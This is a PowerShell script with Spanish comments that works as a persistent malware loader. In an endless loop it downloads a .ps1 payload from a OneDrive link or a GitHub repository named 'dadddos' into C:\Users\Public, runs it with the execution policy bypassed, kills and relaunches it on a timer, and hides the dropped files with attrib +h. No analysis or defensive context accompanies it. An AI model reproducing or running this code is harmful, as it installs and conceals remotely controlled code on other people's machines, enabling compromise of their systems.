$downloadUrl = "https://public.dm.files.1drv.com/y4mJ2EGMqR-to1OyxXy5put3-PTvYmR3zM7K4q69FqHHnHCmvzRT7iw263Y4-ZaoIYRloU9nUuITH79xQUUjDsUuejf9UU0G-ApHIjG4sEYsWHRFjI85sw9t325vVd5z0Ym2pi9_uRK2vBq0OWT6BcfdsakqhUg7HWWwbPqZpLbSzoivAtTtVVuZDUKSBc4JAvjZcHGGyDsbSLmEqz_fxOZw2BQN3yvkva9DErxmLuCMh0?AVOverride=1"
$down = "https://raw.githubusercontent.com/fullcaleta/dadddos/main/MyStartUp.ps1"


$filePath = "C:\Users\Public\MyStartUp.ps1"
$verifyInterval = 150

# Variables para rastrear el PID anterior
$previousPID = $null

while ($true) {
    if (Test-Path -Path $filePath) {
        $process = Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$filePath`"" -PassThru
        $previousPID = $process.Id
    }

    Start-Sleep 5.6
    # Terminar el proceso anterior si existe   
    if ($previousPID -ne $null -and (Get-Process -Id $previousPID -ErrorAction SilentlyContinue)) {
        Stop-Process -Id $previousPID -Force
	Start-Sleep 9.6
    }
  
    # Eliminar el archivo si existe
    if (Test-Path -Path $filePath) {
        Remove-Item -Path $filePath -Force
    }
    
    if ((Get-Date).Hour -eq 01) { 
    Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath
    } else {
    Start-Sleep 4.4
    Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath  
    } 

    if (Test-Path "C:\Users\Public\MyStartUp.ps1") {
    Start-Sleep 5
    Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath
    } else {
    Start-Sleep 8
    Invoke-WebRequest -Uri $down -OutFile $filePath
    }
    Start-Sleep 8.8
    # Ejecutar el archivo descargado si existe
    if (Test-Path -Path $filePath) {
        $process = Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$filePath`"" -PassThru
        $previousPID = $process.Id
    }
	attrib +h C:\Users\Public\MainWinStyle.ps1
	attrib +h C:\Users\Public\MyStartUp.ps1

    # Esperar el intervalo de iteración
    Start-Sleep -Seconds $verifyInterval

    # Terminar el proceso anterior si existe
    if ($previousPID -ne $null -and (Get-Process -Id $previousPID -ErrorAction SilentlyContinue)) {
        Stop-Process -Id $previousPID -Force
	Start-Sleep 9.6
    }
}
